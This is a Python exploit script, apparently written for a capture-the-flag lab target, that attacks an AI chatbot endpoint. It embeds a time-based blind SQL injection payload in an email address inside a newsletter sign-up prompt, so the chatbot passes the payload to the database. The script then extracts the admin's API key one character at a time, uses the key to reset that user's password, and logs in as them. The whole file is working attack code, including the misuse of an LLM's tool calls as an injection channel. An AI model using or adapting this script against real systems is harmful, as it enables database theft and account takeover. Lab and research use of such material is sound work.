#!/usr/bin/env python3
import argparse
import random
import time

import requests


BASE_DEFAULT = "http://www.phantomkernel.htb:30738"
USER = "kuky"
PASSWORD = "Hacked123!"
HEX = "0123456789ABCDEF"


class Oracle:
    def __init__(self, base=BASE_DEFAULT, sleep_seconds=18, threshold=16.0, timeout=70):
        self.base = base.rstrip("/")
        self.sleep_seconds = sleep_seconds
        self.threshold = threshold
        self.timeout = timeout
        self.s = requests.Session()

    def login(self):
        r = self.s.post(
            f"{self.base}/api/auth/login",
            json={"username": USER, "password": PASSWORD},
            timeout=10,
        )
        print(f"[login] {r.status_code} {r.text[:200]}", flush=True)
        r.raise_for_status()

    def once(self, condition):
        email = (
            f"x{random.randint(100000, 999999)}@z.io') "
            f"AND IF(({condition}),SLEEP({self.sleep_seconds}),0)-- -"
        )
        prompt = f"Sign me up for the newsletter with email: {email}"
        started = time.time()
        try:
            r = self.s.post(
                f"{self.base}/api/model/chatbot",
                json={"prompt": prompt},
                timeout=self.timeout,
            )
            elapsed = time.time() - started
        except requests.RequestException as exc:
            elapsed = time.time() - started
            print(f"  [oracle] exception {type(exc).__name__} {elapsed:.2f}s", flush=True)
            return elapsed > self.threshold

        if r.status_code == 429:
            print("  [oracle] 429 model busy; waiting", flush=True)
            time.sleep(12)
            return None

        hit = elapsed > self.threshold
        print(f"  [oracle] {hit!s:5} {elapsed:5.2f}s {condition}", flush=True)
        return hit

    def vote(self, condition, needed=2, attempts=5):
        true_count = 0
        false_count = 0
        tries = 0
        while tries < attempts and true_count < needed and false_count < needed:
            result = self.once(condition)
            if result is None:
                continue
            tries += 1
            if result:
                true_count += 1
            else:
                false_count += 1
            # Give the single-model worker time to clear.
            time.sleep(3)
        if true_count >= needed:
            return True
        if false_count >= needed:
            return False
        # Conservative fallback: one slow hit is not enough.
        return true_count > false_count and true_count >= 2


def key_query(username, active_only=True):
    active = " AND is_active=1" if active_only else ""
    return (
        "SELECT api_key FROM api_keys "
        f"WHERE user_id=(SELECT id FROM users WHERE username='{username}')"
        f"{active} ORDER BY id DESC LIMIT 1"
    )


def count_condition(username, active_only=True):
    active = " AND is_active=1" if active_only else ""
    return (
        "SELECT COUNT(*) FROM api_keys "
        f"WHERE user_id=(SELECT id FROM users WHERE username='{username}')"
        f"{active}"
    )


def extract_hex_key(oracle, username, active_only=True, prefix="phantom_"):
    query = key_query(username, active_only=active_only)
    key = prefix
    print(f"[extract] username={username} active_only={active_only}", flush=True)
    for pos in range(len(prefix) + 1, 19):
        found = None
        for ch in HEX:
            cond = f"SUBSTRING(({query}),{pos},1)='{ch}'"
            if oracle.vote(cond, needed=2, attempts=4):
                found = ch
                break
        if found is None:
            raise RuntimeError(f"no hex character found at position {pos}")
        key += found
        print(f"[extract] pos={pos} char={found} key={key}", flush=True)
        with open(f"{username}_api_key.txt", "w") as f:
            f.write(key)
    return key


def test_key(base, username, key, password):
    r = requests.post(
        f"{base}/api/users/changepw",
        headers={"Content-Type": "application/json", "X-Api-Key": key},
        json={"password": password},
        timeout=15,
    )
    print(f"[changepw {username}] {r.status_code} {r.text[:500]}", flush=True)

    s = requests.Session()
    login = s.post(
        f"{base}/api/auth/login",
        json={"username": username, "password": password},
        timeout=15,
    )
    print(f"[login {username}] {login.status_code} {login.text[:500]}", flush=True)
    me = s.get(f"{base}/api/users/me", timeout=10)
    print(f"[me {username}] {me.status_code} {me.text[:500]}", flush=True)
    return login.status_code == 200


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=BASE_DEFAULT)
    parser.add_argument("--username", choices=["support", "admin"], default="admin")
    parser.add_argument("--inactive", action="store_true")
    parser.add_argument("--sleep", type=int, default=18)
    parser.add_argument("--threshold", type=float, default=16.0)
    parser.add_argument("--password", default=None)
    parser.add_argument("--check-only", action="store_true")
    args = parser.parse_args()

    oracle = Oracle(base=args.base, sleep_seconds=args.sleep, threshold=args.threshold)
    oracle.login()

    print("[calibrate] known true/false", flush=True)
    print("  true :", oracle.vote("1=1", needed=2, attempts=4), flush=True)
    print("  false:", oracle.vote("1=2", needed=2, attempts=4), flush=True)

    active_only = not args.inactive
    exists = oracle.vote(f"({count_condition(args.username, active_only=active_only)})>0", needed=2, attempts=5)
    print(f"[exists] {args.username} active_only={active_only}: {exists}", flush=True)
    if args.check_only or not exists:
        return

    key = extract_hex_key(oracle, args.username, active_only=active_only)
    password = args.password or (f"{args.username.capitalize()}Hacked123!")
    if test_key(args.base.rstrip("/"), args.username, key, password):
        print(f"[SUCCESS] {args.username}:{password} key={key}", flush=True)


if __name__ == "__main__":
    main()
